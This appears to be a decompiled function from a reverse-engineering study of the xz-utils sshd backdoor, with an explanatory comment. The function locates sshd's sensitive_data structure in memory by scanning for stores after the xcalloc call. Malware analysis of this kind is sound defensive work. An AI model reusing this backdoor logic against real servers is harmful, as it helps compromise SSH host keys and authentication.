// /home/kali/xzre-ghidra/xzregh/103680_sshd_get_sensitive_data_address_via_xcalloc.c
// Function: sshd_get_sensitive_data_address_via_xcalloc @ 0x103680
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_get_sensitive_data_address_via_xcalloc(u8 * data_start, u8 * data_end, u8 * code_start, u8 * code_end, string_references_t * string_refs, void * * sensitive_data_out)


/*
 * AutoDoc: Consults the precomputed string-reference table to find the code region that contains sshd's zero-initialisation
 * `xcalloc` call. Immediately after each matching CALL it scans the next handful of instructions for stores into .bss,
 * records up to sixteen unique destinations, and looks for three consecutive slots separated by eight bytes (ptr, ptr+8,
 * ptr+0x10). That stride pattern matches the layout of `sensitive_data`, so the lowest address of the triplet becomes the
 * preferred candidate.
 */

#include "xzre_types.h"

BOOL sshd_get_sensitive_data_address_via_xcalloc
               (u8 *data_start,u8 *data_end,u8 *code_start,u8 *code_end,
               string_references_t *string_refs,void **sensitive_data_out)

{
  u8 *xcalloc_call_target;
  byte bVar1;
  BOOL BVar2;
  long lVar3;
  long lVar4;
  long lVar5;
  long *plVar6;
  dasm_ctx_t *pdVar7;
  u8 *store_operand_ptr;
  ulong uVar9;
  u8 hit_count;
  u8 tracked_reg;
  dasm_ctx_t store_probe_ctx;
  long store_hits[16];
  
  *sensitive_data_out = (void *)0x0;
  xcalloc_call_target = (u8 *)string_refs->entries[0].func_start;
  if (xcalloc_call_target == (u8 *)0x0) {
    return FALSE;
  }
  tracked_reg = 0xff;
  store_operand_ptr = (u8 *)0x0;
  hit_count = 0;
  plVar6 = store_hits;
  for (lVar3 = 0x20; lVar3 != 0; lVar3 = lVar3 + -1) {
    *(undefined4 *)plVar6 = 0;
    plVar6 = (long *)((long)plVar6 + 4);
  }
  pdVar7 = &store_probe_ctx;
  for (lVar3 = 0x16; lVar3 != 0; lVar3 = lVar3 + -1) {
    *(undefined4 *)&pdVar7->instruction = 0;
    pdVar7 = (dasm_ctx_t *)((long)&pdVar7->instruction + 4);
  }
LAB_001036eb:
  do {
    if ((code_end <= code_start) ||
       (BVar2 = find_call_instruction(code_start,code_end,xcalloc_call_target,&store_probe_ctx), BVar2 == FALSE))
    goto LAB_00103802;
    code_start = store_probe_ctx.instruction + store_probe_ctx.instruction_size;
    BVar2 = find_instruction_with_mem_operand_ex
                      (code_start,code_start + 0x20,&store_probe_ctx,0x109,(void *)0x0);
  } while (BVar2 == FALSE);
  if ((store_probe_ctx.prefix.flags_u16 & 0x1040) == 0) {
LAB_00103788:
    if (tracked_reg != 0) {
      code_start = store_probe_ctx.instruction + store_probe_ctx.instruction_size;
      goto LAB_001036eb;
    }
  }
  else {
    if ((store_probe_ctx.prefix.flags_u16 & 0x40) != 0) {
      tracked_reg = store_probe_ctx.prefix._14_1_;
      if ((store_probe_ctx.prefix.flags_u16 & 0x20) != 0) {
        bVar1 = (char)store_probe_ctx.prefix.decoded.rex * '\x02';
LAB_00103782:
        tracked_reg = tracked_reg | bVar1 & 8;
      }
      goto LAB_00103788;
    }
    if ((store_probe_ctx.prefix.flags_u16 & 0x1000) != 0) {
      tracked_reg = store_probe_ctx.imm64_reg;
      if ((store_probe_ctx.prefix.flags_u16 & 0x20) != 0) {
        bVar1 = (char)store_probe_ctx.prefix.decoded.rex << 3;
        goto LAB_00103782;
      }
      goto LAB_00103788;
    }
  }
  if (((store_probe_ctx.prefix.flags_u16 & 0x100) != 0) &&
     (store_operand_ptr = (u8 *)store_probe_ctx.mem_disp,
     ((uint)store_probe_ctx.prefix.decoded.modrm & 0xff00ff00) == 0x5000000)) {
    store_operand_ptr = (u8 *)(store_probe_ctx.mem_disp + (long)store_probe_ctx.instruction) + store_probe_ctx.instruction_size;
  }
  if ((data_start <= store_operand_ptr) && (store_operand_ptr < data_end)) {
    uVar9 = (ulong)hit_count;
    hit_count = hit_count + 1;
    store_hits[uVar9] = (long)store_operand_ptr;
    if (0xf < hit_count) {
LAB_00103802:
      lVar3 = 0;
      do {
        if ((uint)hit_count <= (uint)lVar3) {
          return FALSE;
        }
        lVar4 = 0;
        do {
          lVar5 = 0;
          do {
            if (((void *)store_hits[lVar3] == (void *)(store_hits[lVar4] + -8)) &&
               (store_hits[lVar4] == store_hits[lVar5] + -8)) {
              *sensitive_data_out = (void *)store_hits[lVar3];
              return TRUE;
            }
            lVar5 = lVar5 + 1;
          } while ((uint)lVar5 < (uint)hit_count);
          lVar4 = lVar4 + 1;
        } while ((uint)lVar4 < (uint)hit_count);
        lVar3 = lVar3 + 1;
      } while( TRUE );
    }
  }
  tracked_reg = 0;
  code_start = store_probe_ctx.instruction + store_probe_ctx.instruction_size;
  goto LAB_001036eb;
}

